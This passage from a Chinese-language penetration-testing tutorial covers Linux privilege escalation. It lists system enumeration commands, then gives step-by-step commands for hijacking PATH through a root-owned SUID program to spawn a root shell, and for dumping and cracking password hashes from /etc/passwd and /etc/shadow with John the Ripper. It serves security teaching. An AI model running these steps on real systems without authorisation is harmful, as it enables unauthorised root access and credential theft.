*   **发行版本与内核版本**：通过命令如 `uname -a` 获取系统版本信息，用于寻找对应的内核提权漏洞。
*   **环境变量**：通过 `echo $PATH` 等命令查看，在环境变量提权中会用到。
*   **网络信息**：使用 `ifconfig` 或 `ip addr` 查看网卡信息。
*   **应用程序与服务**：检查运行的服务及其版本（如 `ps aux`, `systemctl list-units`），寻找存在漏洞的服务版本。
*   **以root运行的服务**：寻找由root用户运行但配置存在缺陷的服务。
*   **计划任务**：使用 `crontab -l` 或查看 `/etc/crontab` 文件，检查定时执行的任务。
*   **服务配置**：检查如Apache、Nginx等服务的配置文件（如 `/etc/apache2/apache2.conf`），可能包含敏感信息。

上一节我们探讨了内核漏洞提权，本节中我们来看看利用环境变量和SUID权限进行提权的方法。这种提权方式利用了系统配置和权限设置的缺陷。

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_213.png)

首先，理解两个核心概念：

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_215.png)

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_216.png)

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_218.png)

1.  **PATH环境变量**：指定了系统查找可执行程序的目录列表。当用户输入命令时，系统会按PATH中的顺序在这些目录中查找对应的可执行文件。
    ```bash
    # 查看当前PATH环境变量
    echo $PATH
    ```
2.  **SUID权限**：一种特殊的文件权限，设置在可执行文件上。当用户执行具有SUID权限的程序时，该进程会继承文件所有者的权限（通常是root），而不是执行者的权限。
    ```bash
    # 查找具有SUID权限的文件
    find / -perm -u=s -type f 2>/dev/null
    ```

**提权原理**：如果我们找到一个具有SUID权限、且属主为root的程序，并且该程序在执行时会调用系统命令（如 `ps`），那么我们就可以通过劫持PATH环境变量，让它执行我们恶意构造的命令，从而获得root shell。

**提权步骤示例**：

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_260.png)

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_262.png)

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_264.png)

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_265.png)

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_267.png)

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_268.png)

![](img/3362ec11e73bd0b4f32e2aca5b3b4885_269.png)

1.  假设找到一个SUID程序 `/usr/local/bin/suid_program`，其功能是执行 `ps` 命令。
2.  在可写目录（如 `/tmp`）下创建一个名为 `ps` 的恶意脚本。
    ```bash
    echo '/bin/bash' > /tmp/ps
    chmod 777 /tmp/ps
    ```
3.  将 `/tmp` 目录添加到当前PATH环境变量的最前面，确保系统优先在 `/tmp` 中查找命令。
    ```bash
    export PATH=/tmp:$PATH
    ```
4.  执行SUID程序。此时，该程序会以root权限调用 `ps` 命令，但由于PATH被修改，它实际执行的是 `/tmp/ps`，即启动了一个root权限的bash shell。
    ```bash
    /usr/local/bin/suid_program
    # 成功获得root shell
    whoami
    # 输出：root
    ```

1.  **信息收集**：检查 `/etc/passwd` 文件，寻找密码字段不为 `x` 的用户。
    ```bash
    cat /etc/passwd | grep -v "x:"
    ```
2.  **提取哈希**：如果发现此类用户，提取其密码哈希值。
3.  **破解哈希**：使用在线网站（如 cmd5.com）或本地工具（如 John the Ripper, Hashcat）尝试破解哈希。
    ```bash
    # 示例：使用john破解shadow文件
    unshadow /etc/passwd /etc/shadow > hashes.txt
    john hashes.txt
    ```
4.  **切换用户**：如果成功破解出密码，即可使用 `su` 命令切换到对应用户。
    ```bash
    su username
    # 输入破解得到的密码
    ```
